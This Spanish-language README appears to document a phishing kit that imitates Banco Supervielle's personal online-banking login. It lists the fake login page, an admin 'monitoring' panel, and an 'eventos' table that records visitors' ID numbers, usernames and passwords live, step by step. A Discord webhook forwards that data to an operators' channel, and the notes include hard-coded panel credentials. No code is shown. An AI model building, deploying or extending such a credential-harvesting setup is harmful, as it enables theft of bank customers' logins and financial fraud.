SUPERVIELLE PERSONAS — proyecto local
=====================================

Carpeta: C:\wamp64\www\supervielle-personas

Ver en WAMP:
  http://localhost/supervielle-personas/                 ← Portada
  http://localhost/supervielle-personas/login.html        ← Online Banking Personas
  http://localhost/supervielle-personas/admin/login.php   ← Panel monitoreo
  http://localhost/supervielle-personas/install/          ← Instalador (si hace falta)

Panel gerente (local ya instalado):
  Usuario: gerente
  Contraseña: gerente123

Tablas:
  empleados  → id, nombre, email, rol, activo
  sesiones   → id, empleado_id, inicio, fin, ip, dispositivo, navegador + datos login
  eventos    → monitoreo en vivo (documento, usuario, clave, paso)

Discord (opcional):
  Ver DISCORD.txt — webhook al canal de trabajo

Archivos clave:
  index.html / login.html
  admin/monitor.php
  api/evento.php
  config/config.php
  DISCORD.txt
